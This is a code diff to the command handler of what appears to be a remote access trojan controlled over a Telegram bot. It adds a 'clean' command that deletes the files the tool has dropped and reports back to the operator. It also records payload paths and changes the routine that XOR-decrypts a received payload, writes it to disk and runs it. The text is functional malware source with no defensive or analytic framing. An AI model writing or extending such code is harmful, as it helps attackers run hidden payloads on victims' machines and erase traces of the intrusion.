@@ -6,6 +6,7 @@
 #include "rat/system.hpp"
 
 #include <cstdint>
+#include <exception>
 #include <fmt/chrono.h>
 #include <fmt/core.h>
 #include <tiny-process-library/process.hpp>
@@ -39,6 +40,33 @@ void Handler::parseTelegramMessageToCommand() {
 
 void Handler::handleResetCommand() {
 	this->state = ::rat::handler::RatState();
+}
+
+static std::string _deleteFiles(std::vector<std::string> &Files_Paths) {
+	std::ostringstream output_stream;
+
+		for(auto it = Files_Paths.begin(); it != Files_Paths.end();) {
+				try {
+					std::filesystem::remove(*it);
+					output_stream << *it << " : was deleted\n";
+
+					it = Files_Paths.erase(it);
+				}
+				catch(const std::exception &e) {
+					output_stream << *it << " : failed to be deleted\n"
+					              << e.what() << "\n";
+					++it; // move forward if not erased
+				}
+		}
+
+	return output_stream.str();
+}
+
+void Handler::handleCleanCommand() {
+	this->bot->sendMessage(_deleteFiles(this->written_files));
+		if(this->written_files.capacity() > 15) {
+			this->written_files = {};
+		}
 }
 
 void Handler::handleSetCommand() {
@@ -91,15 +119,13 @@ void Handler::handleFetchCommand() {
 }
 
 void Handler::handleRunCommand() {
-	const std::string time_stamp =
+	const std::string &time_stamp =
 	    ::rat::system::getCurrentDateTime_Underscored();
 
+	// if it fails preserve the old payload;
 	std::vector<uint8_t> copied_payload(this->state.payload);
 
 	const std::string &key = this->state.payload_key;
-
-	::rat::compression::zlibDecompressVector(
-	    this->state.payload, this->state.payload_uncompressed_size);
 
 	::rat::encryption::xorData(this->state.payload.data(),
 	                           this->state.payload.size(), key.c_str());
@@ -124,6 +150,7 @@ void Handler::handleRunCommand() {
 	copied_payload.clear();
 
 	this->handleProcessCommand();
+	this->written_files.push_back(payload_path);
 }
 
 void Handler::handleMkdirCommand() {
